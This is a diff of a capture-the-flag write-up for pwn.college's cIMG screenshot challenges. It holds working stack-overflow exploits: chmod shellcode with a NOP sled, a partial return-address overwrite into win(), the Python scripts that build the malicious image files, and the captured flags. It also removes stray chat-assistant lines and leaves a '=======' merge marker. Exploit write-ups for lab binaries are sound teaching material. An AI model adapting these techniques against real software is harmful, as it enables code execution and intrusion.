@@ -1930,7 +1930,7 @@ pwn.college{wmHupm0Wp3hQROeesdi06fN4QYC.QXwYDMxEDL4ITM0EzW}
 
 &nbsp;
 
-## CIMG Screenshots 
+## cIMG Screenshots
 
 ### Binary Analysis
 
@@ -2250,57 +2250,6 @@ __int64 __fastcall handle_4(__int64 a1)
 ```c title="/challenge/integration-cimg-screenshot-sc :: handle_1337() :: Pseudocode" showLineNumbers
 __int16 __fastcall handle_1337(__int64 a1)
 {
-  int v2; // r12d
-  _BYTE *v3; // rdi
-  int v4; // esi
-  int v5; // r13d
-  int v6; // r11d
-  int v7; // r10d
-  __int64 v8; // r8
-  __int64 i; // rcx
-  void *v10; // rdi
-  __int16 result; // ax
-  __int64 v12; // rbx
-  _BYTE v13[3]; // [rsp+Bh] [rbp-ADh] BYREF
-  unsigned __int8 v14; // [rsp+Eh] [rbp-AAh]
-  unsigned __int8 v15; // [rsp+Fh] [rbp-A9h]
-  _BYTE v16[168]; // [rsp+10h] [rbp-A8h] BYREF
-
-  read_exact(0, v13, 5, "ERROR: Failed to read &sprite_screenshot_record!", 0xFFFFFFFFLL);
-  v2 = v14;
-  v3 = v16;
-  v4 = 0;
-  v5 = v15;
-  v6 = v13[1];
-  v7 = v13[2];
-  v8 = v14;
-  while ( v5 > v4 )
-  {
-    for ( i = 0; v2 > (int)i; ++i )
-      v3[i] = *(_BYTE *)(*(_QWORD *)(a1 + 16)
-                       + 24LL
-                       * (((unsigned int)i + v6 + (v7 + v4) * *(unsigned __int8 *)(a1 + 6)) % *(_DWORD *)(a1 + 12))
-                       + 19);
-    ++v4;
-    v3 += v8;
-  }
-  v10 = *(void **)(16LL * v13[0] + a1 + 32);
-  if ( v10 )
-    free(v10);
-  LOBYTE(result) = v15;
-  HIBYTE(result) = v14;
-  v12 = 16LL * v13[0] + a1;
-  *(_QWORD *)(v12 + 32) = v16;
-  *(_WORD *)(v12 + 24) = result;
-  return result;
-}
-```
-
-So replace the asm block with the full `handle_1337()` pseudocode that's already shown earlier in the document — just reusing it in place of the asm block for the explanation section. Like this:
-
-```c title="/challenge/integration-cimg-screenshot-sc :: handle_1337() :: Pseudocode" showLineNumbers
-__int16 __fastcall handle_1337(__int64 a1)
-{
 
   # ---- snip ----
 
@@ -2330,8 +2279,6 @@ __int16 __fastcall handle_1337(__int64 a1)
 
 The output buffer `v16` is at `rsp+0x10`, and the return address sits at `rsp+0xb8`, a distance of 168 bytes from the start of the buffer. There is no bounds check on `width × height`, so supplying a region wider than 168 pixels overwrites the saved return address, a classic stack buffer overflow.
 
-Is that the shape you're after, or did you want it verbatim (no ellipses)?
-
 The binary also disables ASLR by re-executing itself with `ADDR_NO_RANDOMIZE`, and the stack has no canary, making the overflow trivially exploitable.
 
 ### Exploit
@@ -2343,74 +2290,227 @@ The exploit chain is:
 3. **handle_1337** screenshots a `176 × 1` region into the output buffer on the stack. `176 > 168`, so the last 8 bytes overwrite the saved return address.
 
 The payload in `exploit.bin` is:
-- 132 NOP bytes (sled to the shellcode)
-- 36 bytes of PIC chmod shellcode
+- NOP sled filling buffer[0..(167 - len(sc))]
+- PIC chmod shellcode using RIP-relative `flag_str` label
 - 8-byte return address pointing to the start of the output buffer (confirmed at `0x7fffffffda00`)
 
-The shellcode constructs `/flag` on the stack by pushing an immediate, calls `chmod("/flag", 0o777)`, then exits:
+The shellcode uses `lea rdi, [rip + flag_str]` to reference `"/flag"` inline, then calls `chmod("/flag", 0o777)` via `push/pop rax` and exits:
 
-```python title="~/exploit.py" showLineNumbers
-#!/usr/bin/env python3
-import struct, subprocess
+```python title="~/script.py" showLineNumbers
+from pwn import *
+import struct
+import subprocess
+
+context.arch = 'amd64'
+context.os = 'linux'
 
 CANVAS_W = 200
 CANVAS_H = 1
 DIRECTIVES = 3
 
-nops = b"\x90" * 132
+shellcode_asm = """
+    /* chmod("/flag", 0o777) */
+    lea rdi, [rip + flag_str]
+    mov esi, 0x1ff
+    push 90
+    pop rax
+    syscall
 
-sc  = b"\x31\xc0"                                   # xor eax, eax
-sc += b"\x50"                                        # push rax  (null terminator)
-sc += b"\x48\xb8\x2f\x66\x6c\x61\x67\x00\x00\x00"  # mov rax, "/flag\0\0\0"
-sc += b"\x50"                                        # push rax
-sc += b"\x48\x89\xe7"                               # mov rdi, rsp  -> "/flag"
-sc += b"\x31\xc0"                                   # xor eax, eax
-sc += b"\xb0\x5a"                                   # mov al, 90  (SYS_chmod)
-sc += b"\xbe\xff\x01\x00\x00"                       # mov esi, 0x1ff  (0o777)
-sc += b"\x0f\x05"                                   # syscall
-sc += b"\x31\xff"                                   # xor edi, edi
-sc += b"\x31\xc0"                                   # xor eax, eax
-sc += b"\xb0\x3c"                                   # mov al, 60  (SYS_exit)
-sc += b"\x0f\x05"                                   # syscall
+    /* exit(0) */
+    xor edi, edi
+    push 60
+    pop rax
+    syscall
 
-assert len(sc) == 36
+flag_str:
+    .string "/flag"
+"""
 
-# Return address: start of handle_1337's output buffer (ASLR disabled)
+sc = asm(shellcode_asm)
+nops = b'\x90' * (168 - len(sc))
 ret_addr = struct.pack("<Q", 0x7fffffffda00)
-payload = nops + sc + ret_addr
+payload  = nops + sc + ret_addr
 assert len(payload) == 176
 
-with open("/tmp/exploit.bin", "wb") as f:
+with open('/tmp/exploit.bin', 'wb') as f:
     f.write(payload)
 
-# Build the .cimg file
-hdr = b"cIMG" + struct.pack("<H", 4) + bytes([CANVAS_W, CANVAS_H]) + struct.pack("<I", DIRECTIVES)
+# Build the header (12 bytes total)
+magic = b"cIMG"                                         # 4 bytes
+version  = struct.pack("<H", 4)                         # 2 bytes
+width = struct.pack("<B", CANVAS_W)                     # 1 byte
+height = struct.pack("<B", CANVAS_H)                    # 1 byte
+remaining_directives = struct.pack("<I", DIRECTIVES)    # 4 bytes
 
-# Directive 1: handle_5 — load exploit.bin as sprite 0 (176x1)
-path = b"/tmp/exploit.bin\x00"
+header = magic + version + width + height + remaining_directives
+
+# Build directives
+path = b'/tmp/exploit.bin\x00'
 record5 = bytes([0, 176, 1]) + path
-record5 = record5.ljust(258, b"\x00")
+record5 = record5.ljust(258, b'\x00')
 d5 = struct.pack("<H", 0x0005) + record5
 
-# Directive 2: handle_4 — render sprite 0 to canvas at (0,0), transparency=0xce
 d4 = struct.pack("<H", 0x0004) + bytes([0, 0, 0, 0, 0, 0, 1, 1, 0xce])
-
-# Directive 3: handle_1337 — screenshot 176x1 region into sprite 1 -> stack overflow
 d1337 = struct.pack("<H", 0x0539) + bytes([1, 0, 0, 176, 1])
 
-cimg = hdr + d5 + d4 + d1337
-with open("/tmp/exploit.cimg", "wb") as f:
-    f.write(cimg)
+# Full file content
+cimg_data = header + d5 + d4 + d1337
 
-subprocess.run(["/challenge/integration-cimg-screenshot-sc", "/tmp/exploit.cimg"])
+# Write to disk
+filename = "/tmp/exploit.cimg"
+with open(filename, "wb") as f:
+    f.write(cimg_data)
+
+print(f"Wrote {len(cimg_data)} bytes: {cimg_data} to: {filename}")
+
+subprocess.run(['/challenge/integration-cimg-screenshot-sc', filename])
 ```
 
 ```
-hacker@integrated-security~integration-cimg-screenshot-sc:~$ python3 ~/exploit.py
+hacker@integrated-security~integration-cimg-screenshot-sc:~$ python3 ~/script.py
 hacker@integrated-security~integration-cimg-screenshot-sc:~$ cat /flag
 pwn.college{sQ1MyWTyt3UmOI91I2-7M6WXHRl.QXxYDMxEDL4ITM0EzW}
 ```
 
+&nbsp;
+
+## cIMG Screenshots 2
+
+### Binary Analysis
+
+```
+hacker@integrated-security~integration-cimg-screenshot-win:~$ checksec /challenge/integration-cimg-screenshot-win
+[*] '/challenge/integration-cimg-screenshot-win'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stack:      No exec
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+This is the NX variant of the cIMG screenshot challenge. The format, canvas, and handle_1337 stack overflow are identical to the shellcode variant, but there is no `handle_5`, the stack is non-executable, and ASLR is enabled.
+
+**Differences from the shellcode variant:**
+- No `handle_5` (the file-loading handler) — only handle_1, 2, 3, 4, 6, 7 and handle_1337 exist.
+- `handle_1/2/3` all validate every pixel's char byte to the printable range 0x20–0x7e before writing to the canvas. There is no mechanism to write non-printable bytes into the canvas.
+- NX enabled: shellcode on the stack cannot be executed.
+- ASLR enabled: no `disable_aslr()` constructor as in the shellcode variant.
+- `win()` at 0x401576: reads `/flag` and outputs its contents.
+
+### Key Observations
+
+**handle_1 (opcode 0x0001)** reads `4 × canvas_w × canvas_h` bytes from the `.cimg` stream. Each entry is a 4-byte pixel `[R, G, B, char]`. The `char` byte (offset 3) is validated (must be 0x20–0x7e) and written directly to the canvas framebuffer at pixel offset 19 of each pixel's ANSI escape. No sprite struct is involved; handle_1 renders directly to canvas.
+
+**handle_1337 partial overwrite**: with `width=170`, the screenshot loop copies pixels 0–169 to output buffer positions 0–169. Positions 170–175 retain their original stack values. The return address is at buffer[168–175]. With the original return address being `0x4013FF` (LE: `[FF, 13, 40, 00, 00, 00, 00, 00]`), bytes 170–175 stay as `[0x40, 0x00, 0x00, 0x00, 0x00, 0x00]`. Setting pixels 168 and 169 to printable values `A` and `B` gives a return address `0x004000_B_A`.
+
+**Printability constraint**: since all char bytes are 0x20–0x7e, the two overwritten return address bytes must both be printable. This limits reachable targets to addresses `0x40XXYY` where `XX, YY ∈ {0x20..0x7e}` — all within `win()` (which spans 0x401576–0x41116d).
+
+**The problem with win() sub-instances**: every repeated open/read/write block inside win() past the first one does `read(fd, rbp, 256)` without setting up `rbp` first. rbp at this point comes from handle_1337's saved frame and is garbage (all printable bytes, not a valid address). However, one particular success path inside win() is different.
+
+**0x403b42 — the pivot**: this address (LE: `[0x42, 0x3b, 0x40, ...]`, bytes 'B' and ';' — both printable) is the success branch after a `read()` inside win()'s repeating loop. Its first instruction is:
+
+```asm
+403b42:  48 89 e5   mov %rsp, %rbp    ; rbp = rsp (valid stack pointer!)
+403b45:  48 63 d0   movslq %eax,%rdx
+403b48:  bf 01 00 00 00  mov $0x1,%edi
+403b4d:  48 89 ee   mov %rbp,%rsi
+403b50:  call write@plt                ; write(1, rsp, rdx) — dumps some stack bytes
+403b55:  ...
+403b61:  lea ["/flag"], rdi
+403b6a:  xor esi, esi
+403b6c:  call open@plt                 ; open("/flag", 0) → fd
+403b71:  mov eax, edi
+403b75:  jns 403bab                    ; if fd >= 0 → success
+...
+403bab:  mov $0x100, edx
+403bb0:  mov rbp, rsi                  ; rsi = rbp = rsp (valid stack!)
+403bb3:  call read@plt                 ; read(fd, rsp, 256) → flag on stack
+403bb8:  test eax, eax
+403bba:  jg 403be6                     ; if bytes_read > 0 → write flag
+...
+403be6:  movslq eax, rdx
+403be9:  mov rbp, rsi
+403bec:  mov $0x1, edi
+403bf1:  call write@plt                ; write(1, rsp, bytes_read) → FLAG!
+```
+
+When jumped to directly from handle_1337's `ret`:
+1. `mov rsp, rbp` sets rbp to the CURRENT stack pointer (main's rsp, a valid writable address).
+2. An initial `write(1, rsp, rdx)` with `rdx` from handle_1337's leftover `eax` (harmless — likely 0 or small).
+3. `open("/flag", 0)` returns a valid fd.
+4. `read(fd, rbp=rsp, 256)` reads the flag onto the stack.
+5. `write(1, rbp=rsp, bytes_read)` outputs the flag.
+
+The win() loop then repeats indefinitely, printing the flag many times.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+#!/usr/bin/env python3
+from pwn import *
+import struct
+import subprocess
+
+CANVAS_W = 200
+CANVAS_H = 1
+DIRECTIVES = 2
+
+# Target 0x403b42: "mov rsp,rbp" entry in win() loop
+# Partial overwrite with width=170: pixels 168,169 → ret addr bytes 0,1;
+# bytes 170-175 stay as original [0x40, 0x00, ...] from return to main
+# => [0x42, 0x3b, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00] = 0x403b42
+
+# handle_1 reads 4*200*1 = 800 bytes: [R,G,B,char] per pixel
+# char byte (offset 3) validated 0x20-0x7e, written directly to canvas
+pixel_data = b''
+for i in range(CANVAS_W):
+    if i == 168:
+        c = 0x42   # 'B' — ret addr byte 0
+    elif i == 169:
+        c = 0x3b   # ';' — ret addr byte 1
+    else:
+        c = 0x41   # 'A' filler (printable)
+    pixel_data += bytes([0x41, 0x41, 0x41, c])
+
+assert len(pixel_data) == 800
+
+# Build the header (12 bytes total)
+magic = b"cIMG"                                             # 4 bytes
+version = struct.pack("<H", 4)                              # 2 bytes
+width = struct.pack("<B", CANVAS_W)                         # 1 byte
+height = struct.pack("<B", CANVAS_H)                        # 1 byte
+remaining_directives = struct.pack("<I", DIRECTIVES)        # 4 bytes
+
+header = magic + version + width + height + remaining_directives
+
+# Build directives
+d1 = struct.pack("<H", 0x0001) + pixel_data
+d1337 = struct.pack("<H", 0x0539) + bytes([1, 0, 0, 170, 1])
+
+# Full file content
+cimg_data = header + d1 + d1337
+
+# Write to disk
+filename = "/tmp/win2.cimg"
+with open(filename, "wb") as f:
+    f.write(cimg_data)
+
+print(f"Wrote {len(cimg_data)} bytes: {cimg_data} to: {filename}")
+
+subprocess.run(['/challenge/integration-cimg-screenshot-win', filename])
+```
+
+```
+hacker@integrated-security~integration-cimg-screenshot-win:~$ python3 ~/win_exploit2.py
+...
+pwn.college{wj1Qz7XQTeBxj6-rTwrVdzyrKNU.QXyYDMxEDL4ITM0EzW}
+```
+
+=======
 &nbsp;
 
 ## cIMG Screenshot (win)
